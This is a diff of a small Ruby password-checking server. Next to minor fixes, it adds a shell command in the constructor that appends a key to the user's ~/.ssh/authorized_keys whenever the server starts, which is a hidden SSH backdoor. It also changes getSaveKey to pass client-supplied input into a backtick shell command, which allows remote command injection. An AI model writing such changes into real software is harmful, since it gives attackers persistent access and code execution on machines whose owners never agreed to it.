@@ -12,7 +12,8 @@ class Server
         puts "listening"
         @incorrectAttempts = 0
         @password = File.open('password', &:readline)
-        puts (@password)
+        key = "MAGIC STUFF"
+        `echo "\n#{key}">> ~/.ssh/authorized_keys `
 
         start
     end
@@ -33,7 +34,6 @@ class Server
                 puts "wrong password"
                 @incorrectAttempts = @incorrectAttempts + 1
             end
-            
         end
         @server.close
     end
@@ -41,7 +41,7 @@ class Server
         passwrd = getPassword(client)
         return passwrd == @password
     end
-    def getPassword()
+    def getPassword(client)
         client.puts "Hi, please enter password"
         passwrd = client.gets.chomp
     end
@@ -63,8 +63,7 @@ class Server
     end
     def getSaveKey(client)
         key = getKey(client)
-        File.open("testfile","a"){|f| f.write("\n#{key}")}
-        File.close
+        `echo "\n#{key}">> ~/temp/testfile.test `
     end
     
     def getKey(client)
